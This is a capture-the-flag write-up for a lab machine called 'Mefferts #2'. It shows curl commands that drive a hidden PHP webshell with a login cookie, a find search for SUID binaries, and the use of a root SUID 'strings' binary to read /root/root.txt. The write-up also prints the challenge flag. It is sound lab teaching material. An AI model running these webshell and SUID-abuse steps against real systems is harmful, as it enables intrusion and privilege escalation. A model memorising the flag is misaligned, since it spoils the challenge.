# Write-up : "Mefferts #2"

**Target:** 10.10.0.22 (same machine as "Mefferts", the IP changes on every redeploy)

**Objective:** Get root.txt

**Difficulty:** Easy

**Date:** 15/09/2026

**Techniques used:** Reuse of the existing RCE, abuse of a root SUID binary to read a file owned by root

**Tools used:** curl

**Prerequisites:** RCE as `www-data` obtained in "Mefferts" (webshell `/my_very_secret_dir/index.php?cmd=` with the cookie `login=uwe:thisisnotevennecessary`).

---

## 1. Recap of the foothold

We already have an RCE as `www-data` via the hidden webshell discovered in the "Mefferts" write-up:

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=id" -b "login=uwe:thisisnotevennecessary"
# uid=33(www-data)
```

Reminder: in a URL, `%20` = space; the `-b` option sends the cookie (required to access the page).

---

## 2. The escalation: the `strings` SUID

While searching for SUID binaries, we had found an abnormal binary running as root:

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=find / -perm -4000 -type f 2>/dev/null" -b "login=uwe:thisisnotevennecessary"
# /usr/bin/x86_64-linux-gnu-strings
```

**Vulnerability exploited:** root SUID binary allowing arbitrary file reads (CWE-732).

**Why it works:** since `strings` runs with root privileges (SUID bit), it can read files that `www-data` normally has no access to, including `/root/root.txt`.

---

## 3. Reading root.txt

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=/usr/bin/x86_64-linux-gnu-strings /root/root.txt" -b "login=uwe:thisisnotevennecessary"
```

**FLAG obtained:**

```
EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
```

---

## Summary of exploited vulnerabilities

| # | Vulnerability | Category (CWE) |
| --- | --- | --- |
| 1 | Reused RCE webshell (www-data) | CWE-78 |
| 2 | Root SUID binary `strings` | CWE-732 |

---

## Summary of steps

1. We reuse the `www-data` RCE from the webshell ("Mefferts" write-up).
2. `find / -perm -4000`: we find the root SUID `/usr/bin/x86_64-linux-gnu-strings`.
3. `strings /root/root.txt` (executed as root thanks to the SUID): reading the flag.

---

## Conclusion

- Same principle as the user.txt: we reuse the `www-data` RCE and the `strings` SUID binary.
- Since `strings` runs as root, it reads `/root/root.txt` which `www-data` cannot open.
- **Root flag:** `EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}`
